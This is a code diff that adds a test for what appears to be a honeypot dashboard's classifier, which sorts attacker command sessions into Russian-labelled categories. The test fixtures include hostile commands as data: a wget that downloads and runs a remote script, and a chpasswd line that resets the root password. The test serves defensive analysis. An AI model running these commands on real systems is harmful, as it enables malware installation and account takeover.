@@ -151,3 +151,12 @@ def test_dashboard_api_on_demo_data(tmp_path):
             assert e.code == 404
     finally:
         httpd.shutdown()
+
+
+def test_attack_classification():
+    from ghoul.dashboard import classify
+
+    assert classify(["cd /tmp; wget http://203.0.113.5/x.sh; ./x.sh"]) == "загрузчик ботнета"
+    assert classify(["echo root:x | chpasswd"]) == "захват аккаунта"
+    assert classify(["uname -a", "whoami"]) == "разведка системы"
+    assert classify(["foo"]) == "прочее"
